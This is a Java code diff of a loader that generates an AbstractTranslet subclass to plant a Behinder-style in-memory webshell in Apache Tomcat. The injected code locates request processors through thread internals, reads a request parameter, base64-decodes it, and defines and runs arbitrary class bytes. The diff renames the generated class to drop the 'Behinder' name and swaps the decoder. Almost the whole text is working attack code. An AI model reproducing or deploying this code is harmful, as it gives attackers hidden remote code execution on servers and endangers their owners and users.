@@ -22,7 +22,7 @@ public class Loader {
         classPool.insertClassPath(new ClassClassPath(PageContext.class));
         classPool.insertClassPath(new ClassClassPath(MemBehinder3.class));
 
-        CtClass ctClass = classPool.makeClass("BehinderLoader"+ System.nanoTime());
+        CtClass ctClass = classPool.makeClass("Loader"+ System.nanoTime());
         ctClass.setSuperclass(classPool.getCtClass(AbstractTranslet.class.getName()));
         ctClass.addMethod(CtMethod.make("    public static Object getField(Object obj,String fieldName) throws Exception{\n" +
                 "        java.lang.reflect.Field f0 = null;\n" +
@@ -56,15 +56,12 @@ public class Loader {
                 "                        Object target = getField(thread,\"target\");\n" +
                 "                        Object global = null;\n" +
                 "                        if (target instanceof Runnable){\n" +
-                "                            // 需要遍历其中的 this$0/handler/global\n" +
-                "                            // 需要进行异常捕获，因为存在找不到的情况\n" +
                 "                            try {\n" +
                 "                                global = getField(getField(getField(target,\"this$0\"),\"handler\"),\"global\");\n" +
                 "                            } catch (NoSuchFieldException fieldException){\n" +
                 "                                fieldException.printStackTrace();\n" +
                 "                            }\n" +
                 "                        }\n" +
-                "                        // 如果成功找到了 我们的 global ，我们就从里面获取我们的 processors\n" +
                 "                        if (global != null){\n" +
                 "                            java.util.List processors = (java.util.List) getField(global,\"processors\");\n" +
                 "                            for (i=0;i<processors.size();i++){\n" +
@@ -74,12 +71,13 @@ public class Loader {
                 "                                    org.apache.catalina.connector.Request request = (org.apache.catalina.connector.Request) tempRequest.getNote(1);\n" +
                 "                                    org.apache.catalina.connector.Response response = request.getResponse();\n" +
                 "                                    javax.servlet.http.HttpSession session = request.getSession();\n" +
-
                 "                                     String  c1 = (String)request.getParameter(\"fuck\");\n" +
-
+             //   "System.out.println(c1);"+
+             //   "System.out.println(request);"+
+           //     "System.out.println(request.getParameterMap().size());"+
                 "                                    if (c1 != null){\n" +
                 "                                            try {\n" +
-                "                                                       byte[] cdata = java.util.Base64.getDecoder().decode(c1);\n" +
+                "                                                       byte[] cdata = new sun.misc.BASE64Decoder().decodeBuffer(c1);\n" +
                 "                                                       java.lang.reflect.Method met = Class.forName(\"java.lang.ClassLoader\").getDeclaredMethod(\"defineClass\", new Class[]{byte[].class,int.class, int.class});\n" +
                 "                                                       met.setAccessible(true);\n" +
                 "                                                       Class var20 = (Class)met.invoke(Thread.currentThread().getContextClassLoader(), new Object[]{cdata, new Integer(0), new Integer(cdata.length)});\n" +
